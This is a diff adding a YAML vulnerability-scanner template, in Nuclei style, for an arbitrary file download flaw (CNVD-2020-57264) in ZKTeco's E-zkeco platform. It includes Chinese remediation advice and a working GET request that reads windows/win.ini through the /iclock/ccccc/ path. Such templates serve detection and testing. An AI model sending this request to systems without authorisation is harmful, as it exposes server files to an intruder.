@@ -1,0 +1,27 @@
+id: CNVD-2020-57264
+info:
+  name: 北京中控科技发展有限公司时间&安全精细化管理云平台存在任意文件下载漏洞
+  author:
+  - l0ne1y
+  description: |-
+    E-zkeco 安全精细化管理云平台存在任意文件下载漏洞
+    北京中控科技发展有限公司是时间安全管理、风险投资、绿色农业、矿业开采、OEM生产等领域的企业。北京中控科技发展有限公司时间&安全精细化管理云平台存在任意文件下载漏洞。攻击者可利用该漏洞读取任意文件。
+  severity: high
+  remediation: |-
+    官方修复建议：
+    厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：http://www.zksoftware.com/
+
+    临时修复建议：
+    <br/>1、过滤\".\"，使用户在url中不能回溯上级目录。<br/>2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。<br/>3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+requests:
+- matchers:
+  - type: word
+    words:
+    - for 16-bit app support
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/iclock/ccccc/windows/win.ini'
+  method: GET
